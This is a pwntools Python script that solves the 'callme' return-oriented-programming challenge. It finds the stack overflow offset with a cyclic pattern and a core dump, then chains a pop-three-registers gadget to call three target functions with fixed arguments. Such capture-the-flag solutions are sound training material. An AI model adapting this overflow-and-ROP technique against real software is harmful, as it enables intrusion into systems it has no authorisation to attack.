from pwn import *

def run(argv = [], *a, **kw):
  return process([exe] + argv, *a, **kw)

#Setup
exe = "./callme"
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
context.delete_corefiles = True

#Getting RSP offset
p = run()
payload = cyclic(100)
p.sendlineafter('> ', payload)
p.wait()

core = p.corefile
stack_pointer = core.rsp
info("rsp_pointer = %#x", stack_pointer)
rsp_value = core.read(stack_pointer, 4)
info("cyclic_payload = %#s", payload)
info("rsp_value = %#s", rsp_value)
rsp_offset = cyclic_find(rsp_value)
info('rsp offset: {offset}'.format(offset=rsp_offset))


callme_one = elf.symbols.callme_one
callme_two = elf.symbols.callme_two
callme_three = elf.symbols.callme_three

info("%#x callme_one address", callme_one)
info("%#x callme_two address", callme_two)
info("%#x callme_three address", callme_three)

#0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
#pop3 = 0x000000000040093c

rop = ROP(elf)
pop3 = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
info("%#x pop3 address", pop3)


#ROP chain
payload = flat(
  asm('nop') * rsp_offset,
  pop3,
  0xdeadbeefdeadbeef,
  0xcafebabecafebabe,
  0xd00df00dd00df00d,
  callme_one,
  pop3,
  0xdeadbeefdeadbeef,
  0xcafebabecafebabe,
  0xd00df00dd00df00d,
  callme_two,
  pop3,
  0xdeadbeefdeadbeef,
  0xcafebabecafebabe,
  0xd00df00dd00df00d,
  callme_three
)

write("payload", payload)

p = run()
p.sendlineafter('> ', payload)
print(p.recvall())

